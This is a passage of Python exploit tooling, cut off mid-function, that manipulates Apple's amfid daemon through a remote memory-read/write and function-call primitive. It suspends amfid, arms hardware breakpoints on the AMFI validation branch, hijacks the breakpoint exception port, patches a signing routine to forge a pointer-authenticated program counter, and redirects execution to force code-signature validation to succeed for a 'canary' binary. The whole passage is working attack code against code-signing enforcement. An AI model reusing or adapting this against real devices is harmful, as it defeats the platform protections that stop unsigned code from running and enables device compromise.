                                "getRemoteImageAddress_amfi_debug",
                                image_base + GET_REMOTE_IMAGE_ADDRESS_OFFSET,
                                (
                                    target_task,
                                    all_image_info,
                                    framework_path_address,
                                ),
                            )
                            framework_base = (
                                framework_base_raw & USER_VA_MASK
                            )
                            if framework_base == 0:
                                raise ProtocolError(
                                    "AppleMobileFileIntegrity framework is "
                                    "not loaded in amfid"
                                )
                            branch_context_address = (
                                framework_base
                                + AMFI_VALIDATE_CONTEXT_OFFSET
                            )
                            branch_address = (
                                framework_base
                                + AMFI_VALIDATE_BRANCH_OFFSET
                            )
                            success_address = (
                                framework_base
                                + AMFI_VALIDATE_SUCCESS_OFFSET
                            )
                            await write_memory(
                                remote,
                                path_address,
                                b"\0" * len(AMFI_VALIDATE_CONTEXT_ORIGINAL),
                            )
                            context_result = await call_loader(
                                "task_read_amfid_debug_context",
                                image_base + TASK_READ_OFFSET,
                                (
                                    target_task,
                                    branch_context_address,
                                    path_address,
                                    len(AMFI_VALIDATE_CONTEXT_ORIGINAL),
                                ),
                            )
                            branch_context = await read_memory(
                                remote,
                                path_address,
                                len(AMFI_VALIDATE_CONTEXT_ORIGINAL),
                            )
                            if (
                                context_result & 0xFFFFFFFF
                                or branch_context
                                != AMFI_VALIDATE_CONTEXT_ORIGINAL
                            ):
                                raise ProtocolError(
                                    "amfid validate branch context does not "
                                    "match the exact analyzed framework"
                                )
                            await write_memory(
                                remote,
                                path_address,
                                b"\0" * len(AMFI_VALIDATE_SUCCESS_ORIGINAL),
                            )
                            success_result = await call_loader(
                                "task_read_amfid_debug_success",
                                image_base + TASK_READ_OFFSET,
                                (
                                    target_task,
                                    success_address,
                                    path_address,
                                    len(AMFI_VALIDATE_SUCCESS_ORIGINAL),
                                ),
                            )
                            success_context = await read_memory(
                                remote,
                                path_address,
                                len(AMFI_VALIDATE_SUCCESS_ORIGINAL),
                            )
                            if (
                                success_result & 0xFFFFFFFF
                                or success_context
                                != AMFI_VALIDATE_SUCCESS_ORIGINAL
                            ):
                                raise ProtocolError(
                                    "amfid validate success context does not "
                                    "match the exact analyzed framework"
                                )

                            debug_state_address = (
                                scratch + AMFID_DEBUG_STATE_OFFSET
                            )
                            debug_count_address = (
                                scratch + AMFID_DEBUG_STATE_COUNT_OFFSET
                            )

                            async def get_debug_state(
                                label: str, getter: int, port: int
                            ) -> bytes:
                                await write_memory(
                                    remote,
                                    debug_state_address,
                                    b"\0" * ARM_DEBUG_STATE64_SIZE,
                                )
                                await write_memory(
                                    remote,
                                    debug_count_address,
                                    struct.pack(
                                        "<I", ARM_DEBUG_STATE64_COUNT
                                    ),
                                )
                                get_result = await call_loader(
                                    label,
                                    getter,
                                    (
                                        port,
                                        ARM_DEBUG_STATE64,
                                        debug_state_address,
                                        debug_count_address,
                                    ),
                                )
                                observed_count = struct.unpack(
                                    "<I",
                                    await read_memory(
                                        remote, debug_count_address, 4
                                    ),
                                )[0]
                                if (
                                    get_result & 0xFFFFFFFF
                                    or observed_count
                                    != ARM_DEBUG_STATE64_COUNT
                                ):
                                    raise ProtocolError(
                                        f"{label} failed: mach="
                                        f"{get_result & 0xFFFFFFFF} "
                                        f"count={observed_count}"
                                    )
                                return await read_memory(
                                    remote,
                                    debug_state_address,
                                    ARM_DEBUG_STATE64_SIZE,
                                )

                            async def set_debug_state(
                                label: str,
                                setter: int,
                                port: int,
                                state_bytes: bytes,
                            ) -> None:
                                if (
                                    len(state_bytes)
                                    != ARM_DEBUG_STATE64_SIZE
                                ):
                                    raise ProtocolError(
                                        f"invalid debug state for {label}"
                                    )
                                await write_memory(
                                    remote,
                                    debug_state_address,
                                    state_bytes,
                                )
                                set_result = await call_loader(
                                    label,
                                    setter,
                                    (
                                        port,
                                        ARM_DEBUG_STATE64,
                                        debug_state_address,
                                        ARM_DEBUG_STATE64_COUNT,
                                    ),
                                )
                                if set_result & 0xFFFFFFFF:
                                    raise ProtocolError(
                                        f"{label} failed: "
                                        f"{set_result & 0xFFFFFFFF}"
                                    )

                            def debug_state_is_idle(
                                state_bytes: bytes,
                            ) -> bool:
                                bcr = struct.unpack_from(
                                    "<16Q",
                                    state_bytes,
                                    ARM_DEBUG_STATE64_BCR0_OFFSET,
                                )
                                wcr = struct.unpack_from(
                                    "<16Q",
                                    state_bytes,
                                    ARM_DEBUG_STATE64_WCR0_OFFSET,
                                )
                                mdscr = struct.unpack_from(
                                    "<Q",
                                    state_bytes,
                                    ARM_DEBUG_STATE64_MDSCR_OFFSET,
                                )[0]
                                return (
                                    all((control & 1) == 0 for control in bcr)
                                    and all(
                                        (control & 1) == 0
                                        for control in wcr
                                    )
                                    and (mdscr & 1) == 0
                                )

                            def armed_debug_state(
                                state_bytes: bytes,
                                control: int = ARM_DEBUG_BREAKPOINT_CONTROL,
                            ) -> bytes:
                                armed = bytearray(state_bytes)
                                struct.pack_into(
                                    "<Q",
                                    armed,
                                    ARM_DEBUG_STATE64_BVR0_OFFSET,
                                    branch_address & ~3,
                                )
                                struct.pack_into(
                                    "<Q",
                                    armed,
                                    ARM_DEBUG_STATE64_BCR0_OFFSET,
                                    control,
                                )
                                return bytes(armed)

                            target_suspended = False
                            task_original: bytes | None = None
                            thread_originals: list[
                                tuple[int, bytes]
                            ] = []
                            cleanup_failures: list[str] = []
                            preflight_completed = False
                            exception_port = 0
                            exception_port_installed = False
                            target_resumed_for_redirect = False
                            target_restarted_for_recovery = False
                            trigger_task: asyncio.Task[
                                tuple[int, str]
                            ] | None = None
                            voucher_state: int | None = None
                            try:
                                suspend_result = await call_loader(
                                    "task_suspend_amfid_debug_preflight",
                                    task_suspend_address,
                                    (target_task,),
                                )
                                if suspend_result & 0xFFFFFFFF:
                                    raise ProtocolError(
                                        "task_suspend(amfid) failed: "
                                        f"{suspend_result & 0xFFFFFFFF}"
                                    )
                                target_suspended = True

                                task_original = await get_debug_state(
                                    "task_get_state_amfid_debug_original",
                                    task_get_state_address,
                                    target_task,
                                )
                                if not debug_state_is_idle(task_original):
                                    raise ProtocolError(
                                        "refusing to replace active amfid "
                                        "task debug controls"
                                    )

                                thread_array_address = (
                                    scratch + THREAD_ARRAY_OFFSET
                                )
                                thread_count_address = (
                                    scratch + THREAD_COUNT_OFFSET
                                )
                                await write_memory(
                                    remote, thread_array_address, b"\0" * 8
                                )
                                await write_memory(
                                    remote, thread_count_address, b"\0" * 8
                                )
                                threads_result = await call_loader(
                                    "task_threads_amfid_debug_preflight",
                                    image_base + TASK_THREADS_STUB_OFFSET,
                                    (
                                        target_task,
                                        thread_array_address,
                                        thread_count_address,
                                    ),
                                )
                                if threads_result & 0xFFFFFFFF:
                                    raise ProtocolError(
                                        "task_threads(amfid) failed: "
                                        f"{threads_result & 0xFFFFFFFF}"
                                    )
                                thread_array = struct.unpack(
                                    "<Q",
                                    await read_memory(
                                        remote, thread_array_address, 8
                                    ),
                                )[0] & USER_VA_MASK
                                thread_count = struct.unpack(
                                    "<I",
                                    await read_memory(
                                        remote, thread_count_address, 4
                                    ),
                                )[0]
                                if (
                                    thread_array == 0
                                    or thread_count == 0
                                    or thread_count > 128
                                ):
                                    raise ProtocolError(
                                        "invalid amfid thread inventory: "
                                        f"array=0x{thread_array:x} "
                                        f"count={thread_count}"
                                    )
                                thread_ports = struct.unpack(
                                    f"<{thread_count}I",
                                    await read_memory(
                                        remote,
                                        thread_array,
                                        thread_count * 4,
                                    ),
                                )
                                for index, thread_port in enumerate(
                                    thread_ports
                                ):
                                    if thread_port == 0:
                                        continue
                                    original = await get_debug_state(
                                        "thread_get_state_amfid_debug_"
                                        f"original_{index}",
                                        thread_get_state_address,
                                        thread_port,
                                    )
                                    if not debug_state_is_idle(original):
                                        raise ProtocolError(
                                            "refusing to replace active "
                                            "amfid thread debug controls: "
                                            f"index={index}"
                                        )
                                    thread_originals.append(
                                        (thread_port, original)
                                    )

                                exception_masks_address = (
                                    scratch + AMFID_EXCEPTION_MASKS_OFFSET
                                )
                                exception_handlers_address = (
                                    scratch
                                    + AMFID_EXCEPTION_HANDLERS_OFFSET
                                )
                                exception_behaviors_address = (
                                    scratch
                                    + AMFID_EXCEPTION_BEHAVIORS_OFFSET
                                )
                                exception_flavors_address = (
                                    scratch + AMFID_EXCEPTION_FLAVORS_OFFSET
                                )
                                exception_count_address = (
                                    scratch + AMFID_EXCEPTION_COUNT_OFFSET
                                )
                                for address in (
                                    exception_masks_address,
                                    exception_handlers_address,
                                    exception_behaviors_address,
                                    exception_flavors_address,
                                ):
                                    await write_memory(
                                        remote, address, b"\0" * (32 * 4)
                                    )
                                await write_memory(
                                    remote,
                                    exception_count_address,
                                    struct.pack("<I", 32),
                                )
                                exception_result = await call_loader(
                                    "task_get_exception_ports_amfid_debug",
                                    task_get_exception_ports_address,
                                    (
                                        target_task,
                                        EXC_MASK_BREAKPOINT,
                                        exception_masks_address,
                                        exception_count_address,
                                        exception_handlers_address,
                                        exception_behaviors_address,
                                        exception_flavors_address,
                                    ),
                                )
                                exception_count = struct.unpack(
                                    "<I",
                                    await read_memory(
                                        remote, exception_count_address, 4
                                    ),
                                )[0]
                                if (
                                    exception_result & 0xFFFFFFFF
                                    or exception_count > 32
                                ):
                                    raise ProtocolError(
                                        "task_get_exception_ports(amfid) "
                                        "failed: mach="
                                        f"{exception_result & 0xFFFFFFFF} "
                                        f"count={exception_count}"
                                    )
                                exception_masks = struct.unpack(
                                    f"<{exception_count}I",
                                    await read_memory(
                                        remote,
                                        exception_masks_address,
                                        exception_count * 4,
                                    ),
                                )
                                exception_handlers = struct.unpack(
                                    f"<{exception_count}I",
                                    await read_memory(
                                        remote,
                                        exception_handlers_address,
                                        exception_count * 4,
                                    ),
                                )
                                exception_behaviors = struct.unpack(
                                    f"<{exception_count}I",
                                    await read_memory(
                                        remote,
                                        exception_behaviors_address,
                                        exception_count * 4,
                                    ),
                                )
                                exception_flavors = struct.unpack(
                                    f"<{exception_count}I",
                                    await read_memory(
                                        remote,
                                        exception_flavors_address,
                                        exception_count * 4,
                                    ),
                                )
                                exception_summary = ",".join(
                                    "mask=0x%x/port=0x%x/behavior=0x%x/"
                                    "flavor=%u" % item
                                    for item in zip(
                                        exception_masks,
                                        exception_handlers,
                                        exception_behaviors,
                                        exception_flavors,
                                    )
                                )
                                print(
                                    "amfid-exception-state "
                                    f"count={exception_count} "
                                    f"entries={exception_summary or 'none'}"
                                )

                                armed_task = armed_debug_state(task_original)
                                await set_debug_state(
                                    "task_set_state_amfid_debug_armed",
                                    task_set_state_address,
                                    target_task,
                                    armed_task,
                                )
                                task_readback = await get_debug_state(
                                    "task_get_state_amfid_debug_armed",
                                    task_get_state_address,
                                    target_task,
                                )
                                task_readback_bvr = struct.unpack_from(
                                    "<Q",
                                    task_readback,
                                    ARM_DEBUG_STATE64_BVR0_OFFSET,
                                )[0]
                                task_readback_bcr = struct.unpack_from(
                                    "<Q",
                                    task_readback,
                                    ARM_DEBUG_STATE64_BCR0_OFFSET,
                                )[0]
                                print(
                                    "amfid-task-debug-readback "
                                    f"bvr0=0x{task_readback_bvr:x} "
                                    f"bcr0=0x{task_readback_bcr:x}"
                                )
                                if (
                                    task_readback_bvr
                                    != branch_address & ~3
                                    or task_readback_bcr
                                    != ARM_DEBUG_BREAKPOINT_CONTROL
                                ):
                                    raise ProtocolError(
                                        "amfid task debug-state readback "
                                        "did not retain the armed breakpoint"
                                    )
                                await set_debug_state(
                                    "task_set_state_amfid_debug_restore",
                                    task_set_state_address,
                                    target_task,
                                    task_original,
                                )

                                for index, (
                                    thread_port,
                                    original,
                                ) in enumerate(thread_originals):
                                    armed_thread = armed_debug_state(
                                        original,
                                        ARM_DEBUG_THREAD_BREAKPOINT_CONTROL,
                                    )
                                    await set_debug_state(
                                        "thread_set_state_amfid_debug_armed_"
                                        f"{index}",
                                        thread_set_state_address,
                                        thread_port,
                                        armed_thread,
                                    )
                                    thread_readback = await get_debug_state(
                                        "thread_get_state_amfid_debug_armed_"
                                        f"{index}",
                                        thread_get_state_address,
                                        thread_port,
                                    )
                                    thread_readback_bvr = (
                                        struct.unpack_from(
                                            "<Q",
                                            thread_readback,
                                            ARM_DEBUG_STATE64_BVR0_OFFSET,
                                        )[0]
                                    )
                                    thread_readback_bcr = (
                                        struct.unpack_from(
                                            "<Q",
                                            thread_readback,
                                            ARM_DEBUG_STATE64_BCR0_OFFSET,
                                        )[0]
                                    )
                                    print(
                                        "amfid-thread-debug-readback "
                                        f"index={index} "
                                        f"bvr0=0x{thread_readback_bvr:x} "
                                        f"bcr0=0x{thread_readback_bcr:x}"
                                    )
                                    if (
                                        thread_readback_bvr
                                        != branch_address & ~3
                                        or thread_readback_bcr
                                        != ARM_DEBUG_THREAD_BREAKPOINT_CONTROL
                                    ):
                                        raise ProtocolError(
                                            "amfid thread debug-state "
                                            "readback did not retain the "
                                            f"breakpoint: index={index} "
                                            f"expectedBvr=0x{branch_address & ~3:x} "
                                            "expectedBcr="
                                            f"0x{ARM_DEBUG_THREAD_BREAKPOINT_CONTROL:x} "
                                            f"actualBvr=0x{thread_readback_bvr:x} "
                                            f"actualBcr=0x{thread_readback_bcr:x}"
                                        )
                                    await set_debug_state(
                                        "thread_set_state_amfid_debug_restore_"
                                        f"{index}",
                                        thread_set_state_address,
                                        thread_port,
                                        original,
                                    )

                                if (
                                    args.amfid_hwbp_redirect_probe
                                    is not None
                                ):
                                    if not (
                                        exception_count == 1
                                        and exception_masks[0]
                                        == EXC_MASK_BREAKPOINT
                                        and exception_handlers[0] == 0
                                        and exception_behaviors[0] == 0
                                        and exception_flavors[0] == 0
                                    ):
                                        raise ProtocolError(
                                            "refusing to replace a nonempty "
                                            "amfid breakpoint exception "
                                            "handler"
                                        )

                                    await write_memory(
                                        remote,
                                        exception_count_address,
                                        b"\0" * 8,
                                    )
                                    port_result = await call_loader(
                                        "mach_port_allocate_amfid_exception",
                                        mach_port_allocate_address,
                                        (
                                            task_self,
                                            MACH_PORT_RIGHT_RECEIVE,
                                            exception_count_address,
                                        ),
                                    )
                                    if port_result & 0xFFFFFFFF:
                                        raise ProtocolError(
                                            "mach_port_allocate failed: "
                                            f"{port_result & 0xFFFFFFFF}"
                                        )
                                    exception_port = struct.unpack(
                                        "<I",
                                        await read_memory(
                                            remote,
                                            exception_count_address,
                                            4,
                                        ),
                                    )[0]
                                    if exception_port == 0:
                                        raise ProtocolError(
                                            "mach_port_allocate returned a "
                                            "null exception port"
                                        )
                                    insert_result = await call_loader(
                                        "mach_port_insert_right_amfid_"
                                        "exception",
                                        mach_port_insert_right_address,
                                        (
                                            task_self,
                                            exception_port,
                                            exception_port,
                                            MACH_MSG_TYPE_MAKE_SEND,
                                        ),
                                    )
                                    if insert_result & 0xFFFFFFFF:
                                        raise ProtocolError(
                                            "mach_port_insert_right failed: "
                                            f"{insert_result & 0xFFFFFFFF}"
                                        )
                                    exception_behavior = MACH_EXCEPTION_CODES | (
                                        EXCEPTION_STATE
                                        if args.amfid_state_only_control
                                        else EXCEPTION_STATE_IDENTITY_PROTECTED
                                    )
                                    exception_set_result = await call_loader(
                                        "task_set_exception_ports_amfid_"
                                        "redirect",
                                        task_set_exception_ports_address,
                                        (
                                            target_task,
                                            EXC_MASK_BREAKPOINT,
                                            exception_port,
                                            exception_behavior,
                                            ARM_THREAD_STATE64,
                                        ),
                                    )
                                    if exception_set_result & 0xFFFFFFFF:
                                        raise ProtocolError(
                                            "task_set_exception_ports(amfid) "
                                            "failed: "
                                            f"{exception_set_result & 0xFFFFFFFF}"
                                        )
                                    exception_port_installed = True

                                    await set_debug_state(
                                        "task_set_state_amfid_redirect_armed",
                                        task_set_state_address,
                                        target_task,
                                        armed_debug_state(task_original),
                                    )
                                    for index, (
                                        thread_port,
                                        original,
                                    ) in enumerate(thread_originals):
                                        await set_debug_state(
                                            "thread_set_state_amfid_redirect_"
                                            f"armed_{index}",
                                            thread_set_state_address,
                                            thread_port,
                                            armed_debug_state(
                                                original,
                                                ARM_DEBUG_THREAD_BREAKPOINT_CONTROL,
                                            ),
                                        )

                                    async def run_canary_trigger() -> tuple[
                                        int, str
                                    ]:
                                        await asyncio.sleep(0.25)
                                        trigger_script = str(
                                            Path(__file__).with_name(
                                                "debugserver_carrier_spawn.py"
                                            )
                                        )
                                        process = (
                                            await asyncio.create_subprocess_exec(
                                                sys.executable,
                                                trigger_script,
                                                args.host,
                                                str(args.port),
                                                "--pid",
                                                str(args.expected_parent),
                                                "--timeout",
                                                "30",
                                                "--run-amfid-admission-canary",
                                                stdout=asyncio.subprocess.PIPE,
                                                stderr=asyncio.subprocess.STDOUT,
                                            )
                                        )
                                        try:
                                            output, _ = await asyncio.wait_for(
                                                process.communicate(), 25
                                            )
                                        except BaseException:
                                            if process.returncode is None:
                                                process.terminate()
                                                try:
                                                    await asyncio.wait_for(
                                                        process.wait(), 2
                                                    )
                                                except BaseException:
                                                    process.kill()
                                                    await process.wait()
                                            raise
                                        return (
                                            process.returncode or 0,
                                            output.decode(
                                                "utf-8", "replace"
                                            ),
                                        )

                                    resume_result = await call_loader(
                                        "task_resume_amfid_redirect",
                                        task_resume_address,
                                        (target_task,),
                                    )
                                    if resume_result & 0xFFFFFFFF:
                                        raise ProtocolError(
                                            "task_resume(amfid redirect) "
                                            "failed: "
                                            f"{resume_result & 0xFFFFFFFF}"
                                        )
                                    target_suspended = False
                                    target_resumed_for_redirect = True
                                    trigger_task = asyncio.create_task(
                                        run_canary_trigger()
                                    )

                                    request_address = (
                                        scratch
                                        + MACH_EXCEPTION_BUFFER_OFFSET
                                    )
                                    await write_memory(
                                        remote,
                                        request_address,
                                        b"\0" * MACH_EXCEPTION_BUFFER_SIZE,
                                    )
                                    receive_result = await call_loader(
                                        "mach_msg_receive_amfid_exception",
                                        mach_msg_address,
                                        (
                                            request_address,
                                            MACH_RCV_MSG
                                            | MACH_RCV_TIMEOUT
                                            | MACH_RCV_VOUCHER,
                                            0,
                                            MACH_EXCEPTION_BUFFER_SIZE,
                                            exception_port,
                                            10000,
                                            0,
                                        ),
                                    )
                                    if receive_result & 0xFFFFFFFF:
                                        raise ProtocolError(
                                            "mach_msg receive failed: "
                                            f"0x{receive_result & 0xFFFFFFFF:x}"
                                        )
                                    voucher_state = await call_loader(
                                        "voucher_mach_msg_adopt_amfid_"
                                        "exception",
                                        voucher_mach_msg_adopt_address,
                                        (request_address,),
                                    )
                                    print(
                                        "amfid-hwbp-voucher-adopted "
                                        f"state=0x{voucher_state:x}"
                                    )
                                    request_header = await read_memory(
                                        remote, request_address, 24
                                    )
                                    (
                                        request_bits,
                                        request_size,
                                        reply_port,
                                        request_port,
                                        _voucher_port,
                                        request_id,
                                    ) = struct.unpack(
                                        "<IIIIII", request_header
                                    )
                                    reply_disposition = (
                                        request_bits & 0x1F
                                    )
                                    expected_request_id = (
                                        MACH_EXCEPTION_STATE_REQUEST_ID
                                        if args.amfid_state_only_control
                                        else MACH_EXCEPTION_REQUEST_ID
                                    )
                                    expected_complex = not (
                                        args.amfid_state_only_control
                                    )
                                    message_is_complex = bool(
                                        request_bits & MACH_MSGH_BITS_COMPLEX
                                    )
                                    if not (
                                        message_is_complex
                                        == expected_complex
                                        and reply_disposition
                                        == MACH_MSG_TYPE_MOVE_SEND_ONCE
                                        and 64 <= request_size
                                        <= MACH_EXCEPTION_BUFFER_SIZE
                                        and reply_port != 0
                                        and request_port == exception_port
                                        and request_id == expected_request_id
                                    ):
                                        raise ProtocolError(
                                            "unexpected amfid exception "
                                            "message header: "
                                            f"bits=0x{request_bits:x} "
                                            f"size={request_size} "
                                            f"reply=0x{reply_port:x} "
                                            f"request=0x{request_port:x} "
                                            f"id={request_id} "
                                            "replyDisposition="
                                            f"{reply_disposition}"
                                        )
                                    request_message = await read_memory(
                                        remote,
                                        request_address,
                                        request_size,
                                    )
                                    if args.amfid_state_only_control:
                                        descriptor_count = 0
                                        thread_id = 0
                                        ndr_offset = 24
                                        exception_offset = 32
                                        code_count_offset = 36
                                        code_offset = 40
                                    else:
                                        descriptor_count = struct.unpack_from(
                                            "<I", request_message, 24
                                        )[0]
                                        thread_id = struct.unpack_from(
                                            "<Q", request_message, 48
                                        )[0]
                                        ndr_offset = 40
                                        exception_offset = 56
                                        code_count_offset = 60
                                        code_offset = 64
                                    exception_type = struct.unpack_from(
                                        "<I",
                                        request_message,
                                        exception_offset,
                                    )[0]
                                    code_count = struct.unpack_from(
                                        "<I",
                                        request_message,
                                        code_count_offset,
                                    )[0]
                                    if (
                                        descriptor_count
                                        != (0 if args.amfid_state_only_control else 1)
                                        or not (0 <= code_count <= 2)
                                    ):
                                        raise ProtocolError(
                                            "unexpected amfid exception body: "
                                            f"descriptors={descriptor_count} "
                                            f"codeCount={code_count}"
                                        )
                                    flavor_offset = (
                                        code_offset + code_count * 8
                                    )
                                    old_count_offset = flavor_offset + 4
                                    old_state_offset = old_count_offset + 4
                                    if old_state_offset > request_size:
                                        raise ProtocolError(
                                            "truncated amfid exception state"
                                        )
                                    state_flavor = struct.unpack_from(
                                        "<I",
                                        request_message,
                                        flavor_offset,
                                    )[0]
                                    old_state_count = struct.unpack_from(
                                        "<I",
                                        request_message,
                                        old_count_offset,
                                    )[0]
                                    old_state_size = old_state_count * 4
                                    if (
                                        exception_type != 6
                                        or state_flavor
                                        != ARM_THREAD_STATE64
                                        or old_state_count
                                        != ARM_THREAD_STATE64_COUNT
                                        or old_state_offset + old_state_size
                                        != request_size
                                    ):
                                        raise ProtocolError(
                                            "unexpected amfid exception "
                                            "state shape: "
                                            f"exception={exception_type} "
                                            f"flavor={state_flavor} "
                                            f"count={old_state_count} "
                                            f"size={request_size}"
                                        )
                                    old_state = bytearray(
                                        request_message[
                                            old_state_offset:
                                            old_state_offset + old_state_size
                                        ]
                                    )
                                    received_old_state = bytes(old_state)
                                    trapped_pc_raw = struct.unpack_from(
                                        "<Q",
                                        old_state,
                                        ARM_THREAD_STATE64_PC_OFFSET,
                                    )[0]
                                    trapped_pc = (
                                        trapped_pc_raw & USER_VA_MASK
                                    )
                                    if trapped_pc != branch_address:
                                        raise ProtocolError(
                                            "hardware breakpoint fired at "
                                            "an unexpected PC: "
                                            f"0x{trapped_pc:x}"
                                        )

                                    validator_raw = struct.unpack_from(
                                        "<Q",
                                        old_state,
                                        ARM_THREAD_STATE64_X20_OFFSET,
                                    )[0]
                                    cdhash_object_raw = struct.unpack_from(
                                        "<Q",
                                        old_state,
                                        ARM_THREAD_STATE64_X23_OFFSET,
                                    )[0]
                                    mis_result = struct.unpack_from(
                                        "<I",
                                        old_state,
                                        ARM_THREAD_STATE64_X25_OFFSET,
                                    )[0]
                                    validator = validator_raw & USER_VA_MASK
                                    cdhash_object = (
                                        cdhash_object_raw & USER_VA_MASK
                                    )
                                    print(
                                        "amfid-hwbp-register-binding "
                                        f"validatorRaw=0x{validator_raw:x} "
                                        f"validator=0x{validator:x} "
                                        f"cdhashObjectRaw="
                                        f"0x{cdhash_object_raw:x} "
                                        f"cdhashObject=0x{cdhash_object:x} "
                                        f"mis=0x{mis_result:x}"
                                    )
                                    if validator == 0:
                                        raise ProtocolError(
                                            "exact canary validation did not "
                                            "provide its validator object"
                                        )

                                    url_pointer_raw = struct.unpack(
                                        "<Q",
                                        await read_target(
                                            "amfid_canary_validator_url",
                                            validator + 8,
                                            8,
                                        ),
                                    )[0]
                                    url_pointer = (
                                        url_pointer_raw & USER_VA_MASK
                                    )
                                    if url_pointer == 0:
                                        raise ProtocolError(
                                            "exact canary validator has a "
                                            "null URL"
                                        )
                                    canonical_canary_path = (
                                        image_path.rsplit("/", 1)[0]
                                        + "/codex-amfid-admission-canary"
                                    )
                                    path_result = await remote_call(
                                        "amfid_canary_path",
                                        canary_cfurl_get_filesystem_representation,
                                        (
                                            url_pointer,
                                            0,
                                            canary_path_buffer,
                                            PATH_BUFFER_SIZE,
                                        ),
                                    )
                                    if path_result & 0xFF != 1:
                                        raise ProtocolError(
                                            "exact canary URL filesystem "
                                            "conversion failed: "
                                            f"0x{path_result:x}"
                                        )
                                    observed_path_buffer = await read_target(
                                        "amfid_canary_path_bytes",
                                        canary_path_buffer,
                                        PATH_BUFFER_SIZE,
                                    )
                                    observed_canary_path_bytes, separator, _ = (
                                        observed_path_buffer.partition(b"\0")
                                    )
                                    if not separator:
                                        raise ProtocolError(
                                            "exact canary URL path was not "
                                            "terminated in the bounded buffer"
                                        )
                                    observed_canary_path = (
                                        observed_canary_path_bytes.decode(
                                            "utf-8", "strict"
                                        )
                                    )
                                    expected_canary_paths = {
                                        AMFID_ADMISSION_CANARY_PATH,
                                        canonical_canary_path,
                                    }
                                    if observed_canary_path not in (
                                        expected_canary_paths
                                    ):
                                        raise ProtocolError(
                                            "refusing an AMFI validation for "
                                            "a non-canary path: "
                                            f"{observed_canary_path!r}"
                                        )

                                    if mis_result == 0:
                                        raise ProtocolError(
                                            "the exact canary unexpectedly "
                                            "passed MIS before redirection"
                                        )
                                    can_force_success = False
                                    observed_cdhash = b""
                                    if cdhash_object != 0:
                                        cdhash_length = await remote_call(
                                            "amfid_canary_cdhash_length",
                                            canary_cfdata_get_length,
                                            (cdhash_object,),
                                        )
                                        cdhash_pointer = (
                                            await remote_call(
                                                "amfid_canary_cdhash_pointer",
                                                canary_cfdata_get_byte_ptr,
                                                (cdhash_object,),
                                            )
                                        ) & USER_VA_MASK
                                        if (
                                            cdhash_length
                                            != len(
                                                AMFID_ADMISSION_CANARY_CDHASH
                                            )
                                            or cdhash_pointer == 0
                                        ):
                                            raise ProtocolError(
                                                "exact canary returned an "
                                                "invalid CDHash object: "
                                                f"length={cdhash_length} "
                                                "pointer="
                                                f"0x{cdhash_pointer:x}"
                                            )
                                        observed_cdhash = await read_target(
                                            "amfid_canary_cdhash_bytes",
                                            cdhash_pointer,
                                            len(
                                                AMFID_ADMISSION_CANARY_CDHASH
                                            ),
                                        )
                                        if (
                                            observed_cdhash
                                            != AMFID_ADMISSION_CANARY_CDHASH
                                        ):
                                            raise ProtocolError(
                                                "refusing an AMFI validation "
                                                "for a non-canary CDHash: "
                                                f"{observed_cdhash.hex()}"
                                            )
                                        can_force_success = not (
                                            args.amfid_state_only_control
                                        )

                                    advance_error_control = bool(
                                        args.amfid_state_advance_control
                                    )
                                    redirect_address = (
                                        success_address
                                        if can_force_success
                                        else (
                                            branch_address + 4
                                            if advance_error_control
                                            else branch_address
                                        )
                                    )
                                    change_pc = (
                                        can_force_success
                                        or advance_error_control
                                    )
                                    print(
                                        "amfid-hwbp-canary-binding=verified "
                                        f"path={observed_canary_path} "
                                        "cdhash="
                                        f"{observed_cdhash.hex() or 'missing'} "
                                        f"mis=0x{mis_result:x} "
                                        f"forcedSuccess={int(can_force_success)} "
                                        "advanceErrorControl="
                                        f"{int(advance_error_control)}"
                                    )

                                    state_flags = struct.unpack_from(
                                        "<I",
                                        old_state,
                                        ARM_THREAD_STATE64_FLAGS_OFFSET,
                                    )[0]
                                    signed_redirect_pc = trapped_pc_raw
                                    pc_discriminator = 0
                                    if change_pc:
                                        signed_redirect_pc = redirect_address
                                    if change_pc and not (
                                        state_flags
                                        & ARM_THREAD_STATE64_FLAGS_NO_PTRAUTH
                                    ):
                                        user_diversifier = (
                                            state_flags
                                            & ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK
                                        )
                                        if user_diversifier:
                                            pc_discriminator = (
                                                ARM_THREAD_STATE64_PC_STRING_DISCRIMINATOR
                                                << 48
                                            ) | user_diversifier
                                        else:
                                            pc_discriminator = (
                                                ARM_THREAD_STATE64_PC_STRING_DISCRIMINATOR
                                            )

                                        signer_address = (
                                            image_base
                                            + MAKE_SYM_CALLABLE_OFFSET
                                        )
                                        signer_original = await read_memory(
                                            remote,
                                            signer_address,
                                            len(MAKE_SYM_CALLABLE_PROLOGUE),
                                        )
                                        if (
                                            signer_original
                                            != MAKE_SYM_CALLABLE_PROLOGUE
                                        ):
                                            raise ProtocolError(
                                                "thread-state PC signer "
                                                "precondition failed: "
                                                f"{signer_original.hex()}"
                                            )
                                        await write_memory(
                                            remote,
                                            signer_address,
                                            THREAD_STATE_PC_SIGNER_PATCH,
                                        )
                                        try:
                                            signer_readback = (
                                                await read_memory(
                                                    remote,
                                                    signer_address,
                                                    len(
                                                        THREAD_STATE_PC_SIGNER_PATCH
                                                    ),
                                                )
                                            )
                                            if (
                                                signer_readback
                                                != THREAD_STATE_PC_SIGNER_PATCH
                                            ):
                                                raise ProtocolError(
                                                    "thread-state PC signer "
                                                    "patch verification failed"
                                                )
                                            signed_redirect_pc = (
                                                await call_loader(
                                                    "sign_amfid_thread_state_pc",
                                                    signer_address,
                                                    (
                                                        redirect_address,
                                                        pc_discriminator,
                                                    ),
                                                )
                                            )
                                        finally:
                                            await write_memory(
                                                remote,
                                                signer_address,
                                                MAKE_SYM_CALLABLE_PROLOGUE,
                                            )
                                            signer_restored = (
                                                await read_memory(
                                                    remote,
                                                    signer_address,
                                                    len(
                                                        MAKE_SYM_CALLABLE_PROLOGUE
                                                    ),
                                                )
                                            )
                                            if (
                                                signer_restored
                                                != MAKE_SYM_CALLABLE_PROLOGUE
                                            ):
                                                raise ProtocolError(
                                                    "thread-state PC signer "
                                                    "restore verification failed"
                                                )

                                    if not can_force_success:
                                        await set_debug_state(
                                            "task_set_state_amfid_redirect_"
                                            "disarm_control",
                                            task_set_state_address,
                                            target_task,
                                            task_original,
                                        )
                                        for index, (
                                            thread_port,
                                            original,
                                        ) in enumerate(thread_originals):
                                            await set_debug_state(
                                                "thread_set_state_amfid_"
                                                "redirect_disarm_control_"
                                                f"{index}",
                                                thread_set_state_address,
                                                thread_port,
                                                original,
                                            )
                                        print(
                                            "amfid-hwbp-control-disarmed=1 "
                                            "replyState="
                                            + (
                                                "error-successor"
                                                if advance_error_control
                                                else "original"
